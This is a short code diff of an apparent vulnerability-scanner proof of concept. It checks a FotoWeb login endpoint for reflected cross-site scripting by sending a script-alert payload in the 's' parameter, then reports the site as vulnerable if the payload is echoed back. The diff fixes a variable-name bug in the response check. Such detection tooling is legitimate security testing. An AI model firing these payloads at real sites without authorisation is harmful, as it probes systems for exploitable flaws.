@@ -52,8 +52,8 @@ class Poc(ABPoc):
             arg = '{target}'.format(target=self.target)
             vul_url = arg + \
                 '/fotoweb/cmdrequest/Login.fwx?s="><script>alert(/Sebug23333Test/)</script>'
-            response = requests.get(vul_url).content
-            if type == 'xss' and '>alert(/Sebug23333Test/)' in res.content:
+            res = requests.get(vul_url).text
+            if type == 'xss' and '>alert(/Sebug23333Test/)' in res:
                 self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                     target=self.target, name=self.vuln.name))
 
